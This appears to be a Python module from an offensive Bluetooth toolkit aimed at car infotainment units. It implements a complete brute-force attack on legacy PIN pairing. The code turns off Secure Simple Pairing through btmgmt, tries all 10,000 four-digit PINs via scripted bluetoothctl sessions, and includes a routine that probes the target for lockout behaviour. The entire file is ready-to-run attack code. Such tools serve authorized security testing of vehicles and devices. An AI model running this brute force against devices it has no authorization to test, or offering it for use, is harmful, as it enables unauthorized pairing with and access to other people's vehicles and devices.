"""PIN brute force attack for Bluetooth legacy pairing.

Iterates through PIN codes (0000-9999) and attempts pairing with each via
bluetoothctl. Disables SSP (Secure Simple Pairing) first to force legacy
PIN-based pairing. Includes lockout detection to stop if the target begins
rejecting all attempts.

This targets devices using legacy pairing (Bluetooth 2.0 and older IVIs)
where a fixed 4-digit PIN is expected.
"""

import os
import select
import subprocess
import time

from bt_tap.utils.bt_helpers import run_cmd
from bt_tap.utils.output import info, success, error, warning


class PINBruteForce:
    """Brute-force Bluetooth legacy PINs via bluetoothctl.

    Usage:
        brute = PINBruteForce("AA:BB:CC:DD:EE:FF")
        pin = brute.brute_force(start=0, end=9999)
        if pin:
            print(f"Found PIN: {pin}")
    """

    def __init__(self, address: str, hci: str = "hci0"):
        self.address = address
        self.hci = hci

    def brute_force(self, start: int = 0, end: int = 9999, delay: float = 0.5) -> str | None:
        """Iterate PINs from start to end, attempting each via try_pin().

        Disables SSP before starting to force legacy PIN pairing mode.
        Stops early if lockout is detected (3 consecutive timeouts).

        Args:
            start: First PIN to try (inclusive).
            end: Last PIN to try (inclusive).
            delay: Seconds to wait between attempts.

        Returns:
            The correct PIN string if found, or None.
        """
        info(f"Starting PIN brute force on {self.address} (range {start:04d}-{end:04d})")

        # Disable SSP to force legacy PIN pairing
        info("Disabling SSP to force legacy PIN mode...")
        hci_index = self.hci.replace("hci", "")
        result = run_cmd(["sudo", "btmgmt", "--index", hci_index, "ssp", "off"], timeout=5)
        if result.returncode != 0:
            warning(f"Failed to disable SSP: {result.stderr.strip()}")

        consecutive_timeouts = 0
        total = end - start + 1

        for i, code in enumerate(range(start, end + 1)):
            pin = f"{code:04d}"
            progress = f"[{i + 1}/{total}]"

            succeeded, elapsed = self.try_pin(pin)

            if succeeded:
                success(f"{progress} PIN found: {pin} ({elapsed:.2f}s)")
                return pin

            # Detect lockout: 3+ consecutive timeouts suggests device locked
            if elapsed >= 9.0:
                consecutive_timeouts += 1
                if consecutive_timeouts >= 3:
                    error("Lockout detected: 3 consecutive timeouts. Stopping.")
                    return None
            else:
                consecutive_timeouts = 0

            if i % 50 == 0 and i > 0:
                info(f"{progress} Tried {i} PINs so far, last: {pin}")

            if delay > 0:
                time.sleep(delay)

        warning(f"Exhausted PIN range {start:04d}-{end:04d} without success")
        return None

    def try_pin(self, pin: str) -> tuple[bool, float]:
        """Attempt pairing with a specific PIN via bluetoothctl.

        Sends remove, pair, and PIN entry commands via bluetoothctl stdin.
        Parses output to determine if pairing succeeded.

        Args:
            pin: The PIN string to try (e.g. "1234").

        Returns:
            Tuple of (success, time_taken_seconds).
        """
        # Remove existing pairing to start fresh
        run_cmd(["bluetoothctl", "remove", self.address], timeout=5)
        time.sleep(0.1)

        # Use Popen to send commands interactively so the PIN arrives
        # only after bluetoothctl actually prompts for it.
        t_start = time.time()
        try:
            proc = subprocess.Popen(
                ["bluetoothctl"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                errors="replace",
            )

            # Set up agent and initiate pairing
            setup_commands = [
                "agent off",
                "agent KeyboardOnly",
                "default-agent",
                f"pair {self.address}",
            ]
            for cmd in setup_commands:
                proc.stdin.write(cmd + "\n")
                proc.stdin.flush()
                time.sleep(0.2)

            # Wait for PIN prompt before sending PIN
            deadline = t_start + 10
            output_buf = ""
            pin_sent = False
            while time.time() < deadline:
                remaining = deadline - time.time()
                if remaining <= 0:
                    break
                ready, _, _ = select.select([proc.stdout], [], [], min(remaining, 0.2))
                if ready:
                    chunk = os.read(proc.stdout.fileno(), 4096)
                    if not chunk:
                        break
                    output_buf += chunk.decode("utf-8", errors="replace")

                if not pin_sent and ("Enter PIN" in output_buf or "Passkey" in output_buf):
                    proc.stdin.write(pin + "\n")
                    proc.stdin.flush()
                    pin_sent = True
                    # Give bluetoothctl a moment to process before quitting
                    time.sleep(0.5)

                if "Pairing successful" in output_buf or "Failed to pair" in output_buf:
                    break

            proc.stdin.write("quit\n")
            proc.stdin.flush()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

            output = output_buf
        except Exception:
            return False, time.time() - t_start

        elapsed = time.time() - t_start

        if "Pairing successful" in output:
            return True, elapsed

        return False, elapsed

    def detect_lockout(self, attempts: int = 5) -> dict:
        """Try a few wrong PINs to detect lockout behavior.

        Sends intentionally wrong PINs and measures timing and responses
        to determine if the target implements lockout or backoff.

        Args:
            attempts: Number of wrong PINs to send.

        Returns:
            Dict with timings, responses, and lockout verdict.
        """
        info(f"Testing lockout behavior on {self.address} ({attempts} wrong PINs)")

        # Disable SSP
        hci_index = self.hci.replace("hci", "")
        run_cmd(["sudo", "btmgmt", "--index", hci_index, "ssp", "off"], timeout=5)

        timings = []
        responses = []

        for i in range(attempts):
            # Use obviously wrong PINs
            wrong_pin = f"{9999 - i:04d}"
            succeeded, elapsed = self.try_pin(wrong_pin)
            timings.append(round(elapsed, 3))
            responses.append("paired" if succeeded else "rejected")
            info(f"  Attempt {i + 1}: PIN {wrong_pin} -> {responses[-1]} ({elapsed:.3f}s)")

        # Analyze: lockout if last attempts timeout or dramatically slow down
        locked_out = False
        if len(timings) >= 3:
            # Check if later attempts are much slower (device adding delays)
            avg_early = sum(timings[:2]) / 2
            avg_late = sum(timings[-2:]) / 2
            if avg_late > avg_early * 3 and avg_early > 0:
                locked_out = True
                warning("Lockout/backoff detected: later attempts significantly slower")
            elif all(t >= 9.0 for t in timings[-2:]):
                locked_out = True
                warning("Lockout detected: last attempts all timed out")
            else:
                info("No lockout detected")

        return {
            "target": self.address,
            "attempts": attempts,
            "timings": timings,
            "responses": responses,
            "locked_out": locked_out,
        }
